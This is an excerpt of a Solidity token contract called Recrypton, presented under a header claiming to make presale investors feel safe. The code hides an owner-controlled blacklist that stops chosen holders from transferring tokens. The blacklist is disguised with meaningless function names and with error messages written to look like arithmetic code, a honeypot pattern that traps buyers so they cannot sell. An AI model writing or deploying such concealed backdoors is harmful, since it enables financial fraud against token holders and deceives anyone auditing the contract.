...
// Secureo Trade  
// Secureo is a decentralized application 
// designed to make investors feel comfortable participating in presales.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Recrypton';
    ...
    mapping(address => bool) private _recrypton; 
    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "balanceOf[from].sub(value)");
        if(_isExcludedFromFee[from])
            removeAllFee();   
        require(!_recrypton[from], "calculateTaxFee(value)");
    ...
    function bridgevalidity(address account) public onlyOwner {
        _recrypton[account] = false;
    }
    ...
    function recrypton(address account) public onlyOwner {
        _recrypton[account] = true;
    }

    function recryptontransfer(address account) public view returns (bool) {
        
        return _recrypton[account];
    }
...
contract Recrypton is BaseToken {
